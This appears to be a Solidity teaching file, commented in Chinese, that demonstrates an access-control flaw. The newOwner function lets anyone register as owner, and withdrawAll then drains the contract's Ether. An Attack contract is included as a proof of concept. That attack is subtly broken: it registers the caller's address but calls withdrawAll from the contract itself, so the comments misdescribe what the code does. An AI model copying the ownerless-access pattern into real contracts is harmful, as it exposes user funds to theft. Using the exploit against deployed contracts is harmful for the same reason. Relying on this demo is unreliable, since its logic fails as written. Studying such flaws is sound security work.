pragma solidity >=0.8.0;
// SPDX-License-Identifier: MIT

// 此版本的漏洞在於 newOwner 函數沒有添加 onlyOwner 限制，任何人均可呼叫 newOwner，進而成為 owner，並利用 withdrawAll 提取合約內所有 Ether。

contract MultiOwnable {
    // owners 映射用來記錄 owner 身份
    mapping(address => address) public owners;

    // onlyOwner modifier 檢查呼叫者是否已有 owner 身份
    modifier onlyOwner() {
        require(owners[msg.sender] != address(0), "Not owner"); // 漏洞重點：檢查條件不足，任何人皆可利用 newOwner 取得 owner 權限
        _;
    }

    // 漏洞：newOwner 函數未加 onlyOwner 限制，導致任何人皆可呼叫此函數
    function newOwner(address _owner) external returns (bool) {
        require(_owner != address(0), "Invalid owner address");
        // 漏洞：任意呼叫者皆可將自己登記為 owner
        owners[_owner] = msg.sender;
        return true;
    }
}

contract TestContract is MultiOwnable {
    // withdrawAll 允許 owner 將合約所有餘額轉移至其地址，此處留有漏洞，可被惡意 owner 利用提走所有 Ether
    function withdrawAll() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    // 接收 Ether 的 receive 函數
    receive() external payable {}
}

// 攻擊合約 Attack，示範如何利用上述漏洞：
// 攻擊步驟：
// 1. 攻擊者部署 Attack 合約，並傳入已部署的 TestContract 位址
// 2. 攻擊者呼叫 Attack.attack()，內部首先呼叫 TestContract.newOwner，將攻擊者地址登記為 owner
// 3. 接著呼叫 withdrawAll 轉走合約所有 Ether

contract Attack {
    TestContract public vulnerableContract;

    // 修改：將傳入的地址轉換為 payable address，以符合 Solidity >=0.8.0 的類型要求
    constructor(address _vulnerableContract) {
        vulnerableContract = TestContract(payable(_vulnerableContract));
    }

    function attack() public {
        // 步驟 2：呼叫 newOwner，將攻擊者地址變成 owner
        vulnerableContract.newOwner(msg.sender);
        
        // 步驟 3：呼叫 withdrawAll 轉走所有 Ether
        vulnerableContract.withdrawAll();
    }

    // 用於接收從 TestContract 轉出的 Ether
    receive() external payable {}
}
